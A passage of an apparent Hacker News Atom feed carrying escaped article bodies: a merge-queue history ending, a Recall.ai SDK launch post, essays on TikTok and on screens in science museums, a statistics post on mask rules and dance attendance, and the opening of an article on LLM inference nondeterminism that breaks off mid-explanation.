      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In an academic sense, it's fascinating how a principle from the early 2000s configuration management became a pillar of modern DevOps. The story of merge queue systems is one of increasing automation to support software quality at scale. By eliminating the integration risk of each incremental change, developers can move faster without fear.&lt;/p&gt;
    &lt;p&gt;What began as Graydon Hoare's small Rust bot named after a knight (Bors) has grown into a standard tool in software teams' arsenal, ensuring that code integration is "not rocket science" but a well-engineered process. Merge queues have evolved from niche hacks into an industry standardâbecause as PR velocity increased, they weren't a luxury, they became an operational necessity.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mergify.com/blog/the-origin-story-of-merge-queues"/></entry><entry><id>https://news.ycombinator.com/item?id=45199648</id><title>Launch HN: Recall.ai (YC W20) – API for meeting recordings and transcripts</title><updated>2025-09-10T20:38:35.497625+00:00</updated><content>&lt;doc fingerprint="a577ee7d299cf4c9"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hey HN, we're David and Amanda from Recall.ai (&lt;/p&gt;https://www.recall.ai&lt;p&gt;). Today we’re launching our Desktop Recording SDK, a way to get meeting data without a bot in the meeting: &lt;/p&gt;https://www.recall.ai/product/desktop-recording-sdk&lt;p&gt;. It’s our biggest release in quite a while so we thought we’d finally do our Launch HN :)&lt;/p&gt;&lt;p&gt;Here’s a demo that shows it producing a transcript from a meeting, followed by examples in code: https://www.youtube.com/watch?v=4croAGGiKTA . API docs are at https://docs.recall.ai/.&lt;/p&gt;&lt;p&gt;Back in W20, our first product was an API that lets you send a bot participant into a meeting. This gives developers access to audio/video streams and other data in the meeting. Today, this API powers most of the meeting recording products on the market.&lt;/p&gt;&lt;p&gt;Recently, meeting recording through a desktop form factor instead of a bot has become popular. Many products like Notion and ChatGPT have added desktop recording functionality, and LLMs have made it easier to work with unstructured transcripts. But it’s actually hard to reliably record meetings at scale with a desktop app, and most developers who want to add recording functionality don’t want to build all this infrastructure.&lt;/p&gt;&lt;p&gt;Doing a basic recording with just the microphone and system audio is fairly straightforward since you can just use the system APIs. But it gets a lot harder when you want to capture speaker names, produce a video recording, get real-time data, or run this in production at large scale:&lt;/p&gt;&lt;p&gt;- Capturing speaker names involves using accessibility APIs to screen-scrape the video conference window to monitor who is speaking at what time. When video conferencing platforms change their UI, we must ship a change immediately, so this keeps working.&lt;/p&gt;&lt;p&gt;- Producing a video recording that is clean, and doesn’t capture the video conferencing platform UI involves detecting the participant tiles, cropping them out, and compositing them together into a clean video recording.&lt;/p&gt;&lt;p&gt;- Because the desktop recording code runs on end-user machines, we need to make it as efficient as possible. This means writing highly platform-optimized code, taking advantage of hardware encoders when available, and spending a lot of time doing profiling and performance testing.&lt;/p&gt;&lt;p&gt;Meeting recording has zero margin for failure because if anything breaks, you lose the data forever. Reliability is especially important, which dramatically increases the amount of engineering effort required.&lt;/p&gt;&lt;p&gt;Our Desktop Recording SDK takes care of all this and lets developers build meeting recording features into their desktop apps, so they can record both video conferences and in-person meetings without a bot.&lt;/p&gt;&lt;p&gt;We built Recall.ai because we experienced this problem ourselves. At our first startup, we built a tool for product managers that included a meeting recording feature. 70% of our engineering time was taken up by just this feature! We ended up starting Recall.ai to solve this instead. Since then, over 2000 companies use us to power their recording features, e.g. Hubspot for sales call recording, Clickup for their AI note taker. Our users are engineering teams building commercial products for financial services, telehealth, incident management, sales, interviewing, and more. We also power internal tooling for large enterprises.&lt;/p&gt;&lt;p&gt;Running this sort of infrastructure has led to unexpected technical challenges! For example, we had to debug a 1 in 36 million segfault in our audio encoder (https://www.recall.ai/blog/debugging-a-1-in-36-000-000-segfa...), we encountered a Postgres lock-up that only occurs when you have tens of thousands of concurrent writers (https://news.ycombinator.com/item?id=44490510), and we saved over $1M a year on AWS by optimizing the way we shuffle data around between our processes (https://news.ycombinator.com/item?id=42067275).&lt;/p&gt;&lt;p&gt;You can try it here: https://www.recall.ai. It's self-serve with $5 of free credits. Pricing starts at $0.70 for every hour of recording, prorated to the second. We offer volume discounts with scale.&lt;/p&gt;&lt;p&gt;All data recorded through Recall.ai is the property of our customers, we support 0-day retention, and we don’t train models on customer data.&lt;/p&gt;&lt;p&gt;We would love your feedback!&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=45199648"/></entry><entry><id>https://news.ycombinator.com/item?id=45199713</id><title>ChatGPT Developer Mode: Full MCP client access</title><updated>2025-09-10T20:38:35.397268+00:00</updated><link href="https://platform.openai.com/docs/guides/developer-mode"/></entry><entry><id>https://news.ycombinator.com/item?id=45199760</id><title>TikTok has turned culture into a feedback loop of impulse and machine learning</title><updated>2025-09-10T20:38:35.281576+00:00</updated><content>&lt;doc fingerprint="d7f9508c055bbad9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;TikTok Won. Now Everything Is 60 Seconds.&lt;/head&gt;
    &lt;p&gt;As of September 2025, approximately 170 million Americans spend, on average, one hour every day in an app that is designed to maximize psychological grip. While Congress fixates on TikTok’s data collection usages, what hasn’t received enough attention is how the platform has successfully industrialized human attention itself. Where earlier media relied on polished narratives (films with arcs, shows with seasons), TikTok turned culture into a never-ending feedback loop of impulse and machine learning.&lt;/p&gt;
    &lt;p&gt;TikTok didn’t invent short videos or algorithmic feeds, though. Vine created looping six-second clips in 2013, YouTube has used recommendations for over a decade, Instagram rolled out Stories in 2016, and MTV conditioned audiences to rapid cuts long before any of them. What TikTok did was fuse these scattered experiments into a full-scale system for harvesting attention.&lt;/p&gt;
    &lt;p&gt;Most platforms’ “For You” pages are far less finely tuned. They adjust slowly, learning from signs like likes, follows, or finished videos. TikTok's algorithm learns instantly from micro-behaviors. You can nuke your feed in minutes just by deliberately watching only one type of video—say, pottery clips or capybara memes. That’s because the algorithm heavily weights engagement signs per video rather than long-term user profiles. Public documentation and leaked papers suggest TikTok may also track micro-behaviors such as how long users hover before swiping away. This results in a recommender system that feels uncannily perceptive.&lt;/p&gt;
    &lt;p&gt;However, before today, each medium we’ve invented reshaped how we think and consume information. The printing press trained readers in linear, sequential thought, encouraging sustained focus and complex argumentation. Television created visual storytelling and shared cultural moments, with families watching the same shows at the same time and building collective references. The internet introduced hyperlinked thinking, enabling rapid information switching, comparison of perspectives, and knowledge-building through exploration.&lt;/p&gt;
    &lt;p&gt;Now, the world is picking up on the TikTok model.&lt;/p&gt;
    &lt;p&gt;News organizations like The Washington Post have invested in and expanded a dedicated TikTok team since 2019, producing short and snappy newsroom videos that regularly go viral. In education, students are struggling with assignments longer than a few minutes and expect information delivered in rapid, visually engaging bursts. In entertainment, traditional stand-up comedy builds tension over minutes before a punchline, but TikTok comedians deliver the absurd immediately — a person discovering their roommate has been using their toothbrush as a cleaning brush — and increasingly structure shows around "clippable moments" designed to go viral. Song introductions have shortened dramatically, with one study finding average intros fell from more than 20 seconds in the 1980s to just five, while movie trailers increasingly resemble TikTok compilations: rapid-fire montages of action sequences and emotional beats rather than traditional narrative setups.&lt;/p&gt;
    &lt;p&gt;Cultural consumption itself has also become a form of algorithmic training. Instead of browsing Netflix and choosing what to watch, users scroll TikTok to see what the algorithm predicts. This means that you're not consuming culture; you're teaching a machine how to feed you culture more efficiently.&lt;/p&gt;
    &lt;p&gt;TikTok also rewards hyper-specialization. Entire followings are built on carpet-cleaning videos, paint-mixing shots, or the same dance repeated in new locations. Success comes less from broad talent or universal appeal than from perfecting a narrow niche optimized for the algorithm. In other words, creators who identify and double down on the smallest engagement signals are algorithmically incentivized to specialize, turning micro-content into a precise science of attention capture. This hyper-optimization emerged in markets where dozens of apps competed brutally for user attention. Platforms that kept people engaged survived; the rest died. That evolutionary pressure produced increasingly sophisticated ways to capture attention, and the most successful apps learned to treat human psychology like an engineering problem to be solved through data and iteration.&lt;/p&gt;
    &lt;p&gt;As American platforms adopt TikTok-style optimization, the format sets expectations for all digital content. Micro-optimization techniques are spreading worldwide, establishing a new standard for how human attention is structured algorithmically. TikTok delivers exactly what we want: immediate satisfaction, personalized content, and endless novelty. But efficiency always involves trade-offs. We gain instant access to exactly the content that triggers our reward systems, but we lose the ability to be bored, to sit with incomplete thoughts, to wrestle with ideas that don't immediately pay off. We lose the serendipity of discovering things we didn't know we wanted.&lt;/p&gt;
    &lt;p&gt;Are we making this trade consciously? Most users have never considered that their scrolling patterns are training an algorithm, or that their entertainment has been optimized for maximum psychological grip rather than maximum meaning.&lt;/p&gt;
    &lt;p&gt;The irony, of course, is that if you've read this far, it may mean you’ve already mastered a rare skill: sustained attention in a world of distraction.&lt;/p&gt;
    &lt;p&gt;Subscribe to get weekly insights on China's tech culture that Western media misses.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.thenexus.media/tiktok-won-now-everything-is-60-seconds/"/></entry><entry><id>https://news.ycombinator.com/item?id=45199931</id><title>I didn't bring my son to a museum to look at screens</title><updated>2025-09-10T20:38:35.090335+00:00</updated><content>&lt;doc fingerprint="b742d05caf255249"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;I didn't bring my son to a museum to look at screens&lt;/head&gt;
    &lt;head rend="h4"&gt;If your museum's exhibits could be experienced just as well on an iPad at home, you're doing it wrong.&lt;/head&gt;
    &lt;p&gt;When I was a kid in the ’80s, one of my two favorite places on Earth was The Franklin Institute (TFI) in downtown Philadelphia. We lived a couple hours away so a visit was a rare and precious thing. I think I only visited two or three times but it left an indelible impression on me. I remember wandering in amazement through its enormous spaces getting to actually play with amazing and interesting things. I remember sweeping off a table and then filling an overhanging funnel pendulum with sand, setting it going, and watching it create unexpected patterns on the table. I remember running through the gigantic model heart with other kids. I remember the overpowering joy of being in an actual monumental marble temple of curiosity and fascination. So I was filled with anticipation a couple weeks ago when, during a family trip to the East Coast, we managed to squeeze in a visit to TFI with our six-year-old son.&lt;/p&gt;
    &lt;p&gt;We parked and ran in, paid close to ninety bucks (ouch! but I love you, so take my money), and started off on the top floor with the Wondrous Space exhibit.&lt;/p&gt;
    &lt;p&gt;And were met with screens.&lt;/p&gt;
    &lt;p&gt;Design your own rocket! it said (or something like that). No, I thought, this isn’t designing a rocket, this is playing a lame video game on a touchscreen. Yes, there were space-related artifacts around the walls, and a spacesuit in its own large case, but you couldn’t touch any of this stuff, you couldn’t play with it, you could just look at it for a few seconds, read the placard, say “huh”, and maybe point out some interesting feature to the kiddo.&lt;/p&gt;
    &lt;p&gt;But the screens were given pride of place, dead center in the dimly-lit space. And so they beckoned. My wife — a science writer who used to be the only staff writer covering space for New Scientist and before that, worked at NASA — poked at one of these with my son, added too many boosters to their launch vehicle, and were told it failed “for reasons” in a way she found totally unhelpful and pointless. She led our son gently but firmly away to the glorious four-story Foucault pendulum which hangs in a stairwell.&lt;/p&gt;
    &lt;p&gt;Here are some images from the website showing patrons interacting with (or running past) screens so you can see what I’m talking about:&lt;/p&gt;
    &lt;p&gt;But the screens were all over the place. There were on the main floor, in another section of Wondrous Space, and in the Body Odyssey exhibit. They were all over the SportsZone exhibit on the top floor. Many of them are connected to body motion sensors a la Xbox Kinect so you don’t need to touch them, but they’re still just video games, where the action-response feedback loop is provided by software, not the universe itself.&lt;/p&gt;
    &lt;p&gt;And the wonderful hands-on physical stuff that I loved as a kid? Jammed into out-of-the-way spaces in the Sir Isaac’s Loft and Air Show rooms. These rooms are terrific, and I was delighted to see they were absolutely packed with kids playing with stuff. No screens, just objects and forces — you don’t even need to read anything to enjoy many of the exhibits, such as the one where you sit in one of two chairs hanging from different configurations of block-and-tackle and haul yourself up — and then just let yourself drop, cushioned by a damping piston. Tucked far away in a desolate corner by a hallway we discovered an engaging exhibit where you pluck rods with your finger to generate Lissajous curves from the vibrations. My son was fascinated; he had never seen anything behave like that. And in the Air Show room he liked many of the exhibits, like the one where you (apparently) evacuate a cylinder to see the effect that has on objects moving through it (versus a control). And the “shimmer wall”, where kids generate sound waves using a variety of devices and can then see the sound waves impacting on a reflective and reactive surface was wonderful and really conveys the mechanical nature of sound.&lt;/p&gt;
    &lt;p&gt;But these physical exhibits require maintenance, and I was dismayed to see that several are in bad repair; some of them weren’t even working anymore, some seemed worn out, or didn’t seem well-designed to begin with. For instance, they have the classic “bicycle wheel and rotating stool” gyro effect demonstration, but the wheel was too large a diameter for my son to hold, and the stool seemed to have too much friction to work properly for my wife. There was no one trying to use it before or after us; I’d be curious to see the data on how many visitors attempt it, and how well it usually works for them. And that one should be trivial to design and implement properly: for crying out loud, our local ice cream shop has stools that spin on ball bearings, and I think that would be a big improvement. Every time something didn’t work right I couldn’t help thinking: we paid almost ninety bucks to visit this place. TFI doesn’t seem poor; it seems like its budgetary priorities lie elsewhere.&lt;/p&gt;
    &lt;p&gt;And where it looks like the budget has been going are the screen rooms. They occupy the huge central spaces on the main floor of the museum, and I’m sure a lot of time, money, and passion went into these things. But it’s misguided.&lt;/p&gt;
    &lt;p&gt;I believe museums exist to present the real thing for the visitor to experience with their own senses. Here’s the sculpture — the actual piece of stone, two thousand years old, Greek sculptor unknown — now go ahead and form your impressions. Come back to it when you’re an old man or woman, it will still be here, and you will see it with different eyes. This is a tiny but, to me, beautiful part of the human condition. And what made the Franklin Institute so amazingly special to me as a kid was that the exhibits sat at the intersection of things that kids want to play with, things that kids are allowed to play with, and things that demonstrate some “hey, that’s cool!” scientific phenomenon. And it was all real.&lt;/p&gt;
    &lt;p&gt;But a lame video game? I can do that on my goddamn phone. TFI “was one of the first museums in the nation to offer a hands-on approach to learning about the physical world”, but — and I can’t emphasize this enough, it’s my whole reason for writing this — touchscreens are not actually hands-on. Digital representations aren’t tangible, and touchscreen experiences just don’t activate a kid’s brain (including, I’d say, a sense of delight) the same way a genuinely hands-on experience, like pulling hard on a rope to raise your chair, does.&lt;/p&gt;
    &lt;p&gt;I don’t know why museums are doing this; my idle speculation is that they see themselves as competing with screens for attention, so in a kind of experiential race to the bottom, they feel compelled to bring screens into their exhibits (see: Amusing Ourselves to Death). But now more than ever in history, kids need a break from the screens that all too many of them are sadly often plugged into by default, and connection to the real world instead. Now is the time for TFI — and all museums — to take a stand against the tidal wave of digital garbage that is consuming humanity, especially kids, by eliminating all of their touchscreen “exhibits”.&lt;/p&gt;
    &lt;p&gt;To be fair, TFI is still pretty damn great if you just ignore all the screens. The Franklin Memorial rotunda (free to visit!) is gorgeous. The hands-on stuff, tucked away and apparently suffering from neglect though it is, should be replicated in every city in the world. But it would be so much better if they removed all the screens and put that budget and real estate toward the real, tangible, interactive science exhibits that were the reason the museum was created in the first place, and what made me love it as a child.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://sethpurcell.com/writing/screens-in-museums/"/></entry><entry><id>https://news.ycombinator.com/item?id=45199976</id><title>Wiggling into Correlation</title><updated>2025-09-10T20:38:34.532574+00:00</updated><content>&lt;doc fingerprint="62f3e28c35b00faa"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Wiggling Into Correlation&lt;/head&gt;
    &lt;p&gt;Jeff Kaufman shared some data around contra dance attendance as a function of requirements on wearing surgical masks. He compares this data to survey data, which is a useful way to validate in both directions.&lt;/p&gt;
    &lt;p&gt;I found the plot compelling for a different reason – depending on how we look at it, we can draw wildly different conclusions from it. On the one hand, if we draw boxes around consecutive pairs of dances, it’s fairly obvious that mask-optional dances are more popular. Tickmarks at the top indicate pairs that support the hypothesis.1 Some dances had to be excluded from pairs because there are not equal numbers of both kinds. I decided to mechanically pick “the next pair” whenever there were runs of the same type of dance, which means no bias was introduced by cleverly selecting pairs, even if that particular mechanic may result in more extreme results than some other mechanic.&lt;/p&gt;
    &lt;p&gt;It doesn’t require much statistical literacy to recognise that 18/20 successes is statistically significant.2 For completeness, the Agresti–Coull (“add two successes and two failures”) confidence interval is 68.1–98.5 %, well clear of the null hypothesis of 50 %. I would entertain arguments that this is a sensible procedure, because it’s likely dances close in time share other common factors that affect popularity, so this could be said to give an apples-for-apples comparison.&lt;/p&gt;
    &lt;p&gt;But we don’t know these pairs are of the all-else-equal kind. They rarely aren’t when the experiment is not intentionally designed to be paired. For example, maybe the first dance of a pair tends to steal participants from the second? We could test this by lagging the pairs by one, such that pairs tend to have the mask-required dance first.&lt;/p&gt;
    &lt;p&gt;These pairs aren’t as neat, but when we do this, we discover that only 13 out of the 19 new pairs support the hypothesis. That’s much less obviously meaningful.3 By way of confirmation, the Agresti–Coull interval now comfortably straddles the null hypothesis, at 40.6–89.8 %.&lt;/p&gt;
    &lt;p&gt;Given the lack of pairing in the design, we’ll go back to basics, and compare sources of variation. The number of attendees at the dances wiggles up and down for a multitude of reasons. These reasons (and many more) are called sources of variation in the attendance.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maybe some dances are far away from where everyone lives;&lt;/item&gt;
      &lt;item&gt;maybe some dances coincide with national holidays;&lt;/item&gt;
      &lt;item&gt;maybe some dances are hosted by someone really popular;&lt;/item&gt;
      &lt;item&gt;maybe some dances are not marketed well at all;&lt;/item&gt;
      &lt;item&gt;maybe some dances offer free food;&lt;/item&gt;
      &lt;item&gt;but crucially for our analysis maybe some dances disincentivise attendance by requiring surgical masks.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What we want want to figure out here is “how much of the variation in attendance is due to the mask requirement compared to all other sources?”&lt;/p&gt;
    &lt;p&gt;First we need to figure out how much variation in attendance is there in the first place. This we will call the total variation, and to get it we will censor each data point such that we don’t know whether it belongs to a mask-required or mask-optional dance.&lt;/p&gt;
    &lt;p&gt;In order to estimate the variation on the go, there’s that spc hack to get the total standard deviation of the data. We start by imagining vertical bars between consecutive points in the plot. The height of these bars make up a kind of measure of the internal variation in the data. We estimate the height of these bars by reference to the gridlines, and compute their mean height.&lt;/p&gt;
    &lt;p&gt;To be clear, we never actually print out the plot and draw bars on it, nor do we ever write down the individual heights of the bars. We simply scan through the plot, eyeball the vertical distance between consecutive points, and continuously sum the distances up. Then we divide by the number of points minus one. On my way to work, I got 41 as the average vertical distance between points. Your number is likely to be different, as this is not an exact procedure.&lt;/p&gt;
    &lt;p&gt;As detailed in the article on this hack, this process overestimates the standard deviation by 12.8 %, so we’ll scale back and arrive at 36 as the standard deviation. We square this to get the total variance: 1,320.&lt;/p&gt;
    &lt;p&gt;Then we perform the same operation on just the mask-required dances.&lt;/p&gt;
    &lt;p&gt;We estimate the average height of the bars to be 34. What’s neat about this level of variation is that it’s independent of the effects of mask requirements, since the mask requirements are the same for all dances here. In other words, this variation must be due to sources other than masking. We’ll do the same thing for the mask-optional dances.&lt;/p&gt;
    &lt;p&gt;The averge height here is maybe 45. We are going to assume that the same sources of variation affect both mask-required and mask-optional dances, so we’ll take the average of these averages:&lt;/p&gt;
    &lt;p&gt;\[\frac{19 \times 34 + 23 \times 45}{19 + 23} \approx 40\]&lt;/p&gt;
    &lt;p&gt;We land at a grand average across both groups of 40. Corrected and squared, this is a variance of 1,260.&lt;/p&gt;
    &lt;p&gt;As a reminder: the variance we got out of the groups independently, 1,260, must be due to sources other than masking requirements, since the masking requirements are the same for all dances within those groups. This is to be contrasted with the total variation, 1,320, which includes the additional variation source of masking requirements.&lt;/p&gt;
    &lt;p&gt;Since we have measured variation using the variance, our measurements are additive: the total variance is the sum of all sources of variance. Thus, we can fill out the equation:&lt;/p&gt;
    &lt;quote&gt;total_variance = other_sources + masking_requirements 1320 = 1260 + ?&lt;/quote&gt;
    &lt;p&gt;and it’s clear we’re looking at&lt;/p&gt;
    &lt;quote&gt;total_variance = other_sources + masking_requirements 1320 = 1260 + 60&lt;/quote&gt;
    &lt;p&gt;In other words, other sources account for most of the variation in dance attendance, and masking only plays a small part. The amount of the total variation contributed by masking requirements is 5 %. This number is called the coefficient of determination, and its square root is the correlation: 0.21. This correlation is low enough that we cannot conclude that masking has a significant effect on attendance.4 For details on this, see the surprising richness of correlations.&lt;/p&gt;
    &lt;p&gt;But look at that! We measured the total variation, and then we measured the variation within the groups to figure out how much variation is caused by sources other than masking, and this let us paint an intuitive picture of how much of an effect masking has. The correlation we got out of this handwavy procedure is even somewhat close to the real number. To make sure, I transcribed the plot into numbers, and R tells me the correlation is actually 0.29.5 Still not statistically significant at traditional levels.&lt;/p&gt;
    &lt;p&gt;“But it still looks like masking has an effect!!” It does. It’s just that if the effect is there, it is small enough that we cannot statistically prove an effect with just 44 dances. Assuming the coefficient of determination really is 5 %, and we are aiming for a traditional significance level of 0.05, the sample size curves tell us we would need over 80 dances to be sure of the effect of masking.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://entropicthoughts.com/wiggling-into-correlation"/></entry><entry><id>https://news.ycombinator.com/item?id=45200118</id><title>Anthropic Services Down</title><updated>2025-09-10T20:38:34.083084+00:00</updated><content>&lt;doc fingerprint="76df1dc33e5bece9"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt; Subscribe to updates for API, Claude.ai, and Console services impacted via email and/or text message. You'll receive email notifications when incidents are updated, and text message notifications whenever Anthropic creates or resolves an incident. &lt;/p&gt;
      &lt;div&gt;
        &lt;div&gt;
          &lt;div/&gt;
        &lt;/div&gt;
        &lt;div&gt;
          &lt;div&gt;
            &lt;p&gt;To receive SMS updates, please verify your number. To proceed with just email click ‘Subscribe’ &lt;/p&gt;
          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://status.anthropic.com/incidents/k6gkm2b8cjk9"/></entry><entry><id>https://news.ycombinator.com/item?id=45200593</id><title>Bild AI (YC W25) Is Hiring</title><updated>2025-09-10T20:38:33.528536+00:00</updated><content>&lt;doc fingerprint="19b82e91a7888e36"&gt;
  &lt;main&gt;
    &lt;p&gt;AI that understands construction blueprints&lt;/p&gt;
    &lt;p&gt;Puneet and I (Roop) founded Bild AI to tackle the mess that is blueprint reading, cost estimation, and permit applications in construction. It's a tough technical problem that requires the newest CV and AI approaches, and we’re impact-driven to make it more efficient to build more houses, hospitals, and schools. Featured on Business Insider.&lt;/p&gt;
    &lt;p&gt;Bild AI is an early-stage startup with a ton of really difficult technical challenges to solve. We're building blueprint understanding with a model-garden approach, so there is a lots of ground to break. We raised from the top VCs in the world before demo day and have a customer-obsessed approach to product development.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.ycombinator.com/companies/bild-ai/jobs/m2ilR5L-founding-engineer-applied-ai"/></entry><entry><id>https://news.ycombinator.com/item?id=45200925</id><title>Defeating Nondeterminism in LLM Inference</title><updated>2025-09-10T20:38:33.065820+00:00</updated><content>&lt;doc fingerprint="1758903540295f97"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Defeating Nondeterminism in LLM Inference&lt;/head&gt;&lt;p&gt;Reproducibility is a bedrock of scientific progress. However, it’s remarkably difficult to get reproducible results out of large language models.&lt;/p&gt;&lt;p&gt;For example, you might observe that asking ChatGPT the same question multiple times provides different results. This by itself is not surprising, since getting a result from a language model involves “sampling”, a process that converts the language model’s output into a probability distribution and probabilistically selects a token.&lt;/p&gt;&lt;p&gt;What might be more surprising is that even when we adjust the temperature down to 0This means that the LLM always chooses the highest probability token, which is called greedy sampling. (thus making the sampling theoretically deterministic), LLM APIs are still not deterministic in practice (see past discussions here, here, or here). Even when running inference on your own hardware with an OSS inference library like vLLM or SGLang, sampling still isn’t deterministic (see here or here).&lt;/p&gt;&lt;p&gt;But why aren’t LLM inference engines deterministic? One common hypothesis is that some combination of floating-point non-associativity and concurrent execution leads to nondeterminism based on which concurrent core finishes first. We will call this the “concurrency + floating point” hypothesis for LLM inference nondeterminism. For example, a recent arXiv preprint writes:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Floating-point arithmetic in GPUs exhibits non-associativity, meaning $(a + b) + c \neq a + (b + c)$ due to finite precision and rounding errors. This property directly impacts the computation of attention scores and logits in the transformer architecture, where parallel operations across multiple threads can yield different results based on execution order.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;You can also find the “concurrency + floating point” hypothesis repeated by others, like here (“There are speed tradeoffs, and in order to make the endpoints fast GPUs are used, which do parallel [nondeterministic] calculations. Any modern GPU neural net calculations will be subject to these."), or here (“Because GPUs are highly parallelized, the ordering of additions or multiplications might be different on each execution, which can cascade into small differences in output.").&lt;/p&gt;&lt;p&gt;While this hypothesis is not entirely wrong, it doesn’t reveal the full picture. For example, even on a GPU, running the same matrix multiplication on the same data repeatedly will always provide bitwise equal results. We’re definitely using floating-point numbers. And our GPU definitely has a lot of concurrency. Why don’t we see nondeterminism in this test?&lt;/p&gt;&lt;code&gt;A = torch.randn(2048, 2048, device='cuda', dtype=torch.bfloat16)
B = torch.randn(2048, 2048, device='cuda', dtype=torch.bfloat16)
ref = torch.mm(A, B)
for _ in range(1000):
    assert (torch.mm(A, B) - ref).abs().max().item() == 0
&lt;/code&gt;&lt;p&gt;To understand the true cause of LLM inference nondeterminism, we must look deeper.&lt;/p&gt;&lt;p&gt;Unfortunately, even defining what it means for LLM inference to be deterministic is difficult. Perhaps confusingly, the following statements are all simultaneously true:&lt;/p&gt;&lt;list rend="ol"&gt;&lt;item&gt;Some kernels on GPUs are nondeterministic.&lt;/item&gt;&lt;item&gt;However, all the kernels used in a language model’s forward pass are deterministic.&lt;/item&gt;&lt;item&gt;Moreover, the forward pass of an LLM inference server (like vLLM) can also be claimed to be deterministic.&lt;/item&gt;&lt;item&gt;Nevertheless, from the perspective of anybody using the inference server, the results are nondeterministic.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;In this post, we will explain why the “concurrency + floating point” hypothesis misses the mark, unmask the true culprit behind LLM inference nondeterminism, and explain how to defeat nondeterminism and obtain truly reproducible results in LLM inference.&lt;/p&gt;&lt;head rend="h2"&gt;The original sin: floating-point non-associativity&lt;/head&gt;&lt;p&gt;Before talking about nondeterminism, it’s useful to explain why there are numerical differences at all. After all, we typically think of machine learning models as mathematical functions following structural rules such as commutativity or associativity. Shouldn’t there be a “mathematically correct” result that our machine learning libraries should provide us?&lt;/p&gt;&lt;p&gt;The culprit is floating-point non-associativity. That is, with floating-point numbers:&lt;/p&gt;$$ (a + b) + c \neq a + (b + c) $$&lt;code&gt;(0.1 + 1e20) - 1e20
&amp;gt;&amp;gt;&amp;gt; 0
0.1 + (1e20 - 1e20)
&amp;gt;&amp;gt;&amp;gt; 0.1
&lt;/code&gt;&lt;p&gt;Ironically, breaking associativity is what makes floating-point numbers useful.&lt;/p&gt;&lt;p&gt;Floating-point numbers are useful because they allow for a “dynamic” level of precision. For the purposes of explanation, we will use base 10 (instead of binary), where floating-point numbers are in the format $\text{mantissa} * 10^\text{exponent}$. We will also use 3 digits for the mantissa and 1 digit for the exponent.&lt;/p&gt;&lt;p&gt;For example, for the value 3450, we can represent it exactly as $3.45 * 10^3$. We can also represent much smaller values like 0.486 as $4.86 * 10^{-1}$. In this way, floating point allows us to represent both very small as well as very large values. In the sciences, we might say that floating point allows us to maintain a constant number of “significant figures”.&lt;/p&gt;&lt;p&gt;If you add together two floating-point numbers with the same exponent, it looks similar to integer addition. For example, 123 ($1.23 * 10^2$) + 456 ($4.56 * 10^2$) results in 579 ($5.79 * 10^2$).&lt;/p&gt;&lt;p&gt;But what happens when we add two floating-point numbers with different exponents, such as 1230 and 23.4? In this case, the exact result is 1253.4. However, we can only maintain 3 digits of precision at a time. Floating-point addition will thus drop the last 2 digits and obtain the value $1.25 * 10^3$ (or 1250).&lt;/p&gt;&lt;p&gt;At this point, however, we’ve destroyed information. Note that this can happen every time we add two floating-point numbers with different “scales” (i.e. different exponents). And adding together floating-point numbers with different exponents happens all of the time. In fact, if we could guarantee that we never needed different exponents, we could just use integers!&lt;/p&gt;&lt;p&gt;In other words, every time we add together floating-point numbers in a different order, we can get a completely different result. To take an extreme example, there are 102 possible different results for summing this array depending on the order.&lt;/p&gt;&lt;code&gt;import random

vals = [1e-10, 1e-5, 1e-2, 1]
vals = vals + [-v for v in vals]

results = []
random.seed(42)
for _ in range(10000):
    random.shuffle(vals)
    results.append(sum(vals))

results = sorted(set(results))
print(f"There are {len(results)} unique results: {results}")

# Output:
# There are 102 unique results: [-8.326672684688674e-17, -7.45931094670027e-17, ..., 8.326672684688674e-17]
&lt;/code&gt;&lt;p&gt;Although this is the underlying cause for non-identical outputs, it does not directly answer where the nondeterminism comes from. It doesn’t help us understand why floating-point values get added in different orders, when that happens, nor how it can be avoided.&lt;/p&gt;&lt;p&gt;The answers lie in how kernels are implemented.&lt;/p&gt;&lt;head rend="h2"&gt;Why don’t kernels always add numbers in the same order?&lt;/head&gt;&lt;p&gt;As mentioned above, one common explanation for why kernels add numbers in different orders is the “concurrency + floating point” hypothesis. The hypothesis states that if the order in which concurrent threads finish is nondeterministic and the accumulation order depends on the order in which concurrent threads finish (such as with an atomic add), our accumulation order will be nondeterministic as well.&lt;/p&gt;&lt;p&gt;Confusingly, although this can lead to nondeterministic kernels, concurrency (and atomic adds) end up being completely uninvolved in LLM inference nondeterminism! To explain what the real culprit is, let’s first understand why modern GPU kernels rarely need atomic adds.&lt;/p&gt;&lt;head rend="h2"&gt;When are atomic adds needed?&lt;/head&gt;&lt;p&gt;Typically a GPU launches a program concurrently across many “cores” (i.e. SMs). As the cores have no inherent synchronization among them, this poses a challenge if the cores need to communicate among each other. For example, if all cores must accumulate to the same element, you can use an “atomic add” (sometimes known as a “fetch-and-add”). The atomic add is “nondeterministic” — the order in which the results accumulate is purely dependent on which core finishes first.&lt;/p&gt;&lt;p&gt;Concretely, imagine that you are reducing a 100-element vector with 100 cores (e.g. &lt;code&gt;torch.sum()&lt;/code&gt;). 